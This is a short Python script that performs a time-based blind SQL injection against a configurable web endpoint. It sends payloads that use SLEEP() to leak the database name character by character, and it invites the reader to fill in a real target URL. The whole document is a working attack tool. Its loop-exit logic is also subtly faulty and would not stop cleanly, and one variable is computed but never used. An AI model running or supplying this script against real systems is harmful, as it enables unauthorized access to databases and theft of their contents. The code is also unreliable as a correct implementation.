import requests
import time

# Configuration variables
url = "http://example.com/vulnerable-endpoint.php"  # Replace with the target URL
data_key = "username"  # The parameter to test for SQL injection (e.g., "username")
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"  # Character set for the attack
injected_data = ""  # The initial data being guessed (empty to start)

# Oracle function to test a payload
def oracle(payload):
    data = {data_key: payload}
    requests.post(url, data=data)

# Function to perform a time-based Blind SQL Injection
def time_based_blind_injection():
    global injected_data

    while True:
        for char in charset:
            # Construct the payload using time-based SQL Injection
            payload = injected_data + char
            sql_injection_payload = f"1' AND IF(SUBSTRING((SELECT database()),{len(injected_data)+1},1)='{char}', SLEEP(5), 0)--"
            
            # Test the payload by injecting the time delay
            start_time = time.time()
            oracle(sql_injection_payload)
            end_time = time.time()
            
            # If the delay is detected, the character is part of the injected data
            if end_time - start_time > 4:  # Adjust this threshold as needed
                injected_data += char
                print(f"Guessed so far: {injected_data}")
                break
        # If no new character is guessed, exit the loop
        if len(injected_data) > 0 and not any(char in injected_data for char in charset):
            print("Injection complete!")
            break

# Start the Blind SQL Injection process
print("[!] Starting Blind SQL Injection...")
time_based_blind_injection()
